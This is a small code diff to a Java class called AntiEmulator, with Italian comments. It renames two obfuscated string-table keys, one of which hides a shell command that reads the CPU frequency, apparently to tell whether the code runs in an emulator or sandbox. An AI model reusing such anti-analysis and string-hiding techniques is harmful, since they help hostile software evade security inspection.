@@ -133,7 +133,7 @@ public class AntiEmulator {
 		}
 
 		// "/"
-		index = keys.lastIndexOf(Messages.getString("36.7"));
+		index = keys.lastIndexOf(Messages.getString("36_7"));
 
 		if (index == -1) {
 			return false;
@@ -227,7 +227,7 @@ public class AntiEmulator {
 		Execute exec = new Execute();
 
 		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
-		ExecuteResult ret = exec.execute(Messages.getString("36.8"));
+		ExecuteResult ret = exec.execute(Messages.getString("36_8"));
 
 		// Ci interessa solo la prima riga
 		for (String frequency : ret.stdout) {
